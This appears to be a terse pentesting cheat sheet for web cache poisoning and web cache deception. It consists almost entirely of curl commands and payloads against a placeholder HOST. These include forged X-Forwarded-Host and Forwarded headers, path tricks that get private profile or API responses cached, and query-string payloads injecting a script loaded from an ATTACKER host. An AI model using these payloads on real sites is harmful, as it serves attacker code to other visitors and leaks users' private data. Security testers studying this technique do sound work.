# Cache

## Check Headers

```bash
curl -i 'http://HOST/path'
curl -i 'http://HOST/path?x=1'
curl -i 'http://HOST/path' -H 'X-Forwarded-Host: ATTACKER'
```

Look for:

```http
Age:
X-Cache: HIT
CF-Cache-Status: HIT
Cache-Control:
Vary:
```

## Web Cache Deception

```text
/profile/nonexistent.css
/profile%2fnonexistent.css
/profile;foo.css
/profile/..;/foo.css
/api/me/avatar.png
```

If response contains private HTML/JSON and cache stores by extension, fetch it again without cookies.

## Poison Host

```bash
curl 'http://HOST/page' -H 'X-Forwarded-Host: ATTACKER'
curl 'http://HOST/page' -H 'X-Host: ATTACKER'
curl 'http://HOST/page' -H 'Forwarded: host=ATTACKER'
```

Targets:

```html
<script src="https://ATTACKER/app.js"></script>
<link rel="canonical" href="https://ATTACKER/">
```

## Unkeyed Query

```text
/page?cb=1
/page?utm_content=<script src=https://ATTACKER/x.js></script>
/page?next=https://ATTACKER/
```

## Param Cloaking

```text
/page?x=1&utm_content=evil
/page?x=1;utm_content=evil
/page?x=1%26utm_content=evil
```

## Cache Key Probes

```bash
curl -i 'http://HOST/a?x=1' -H 'Accept-Encoding: gzip'
curl -i 'http://HOST/a?x=2' -H 'Accept-Encoding: gzip'
curl -i 'http://HOST/a?x=1' -H 'X-Forwarded-Scheme: http'
```

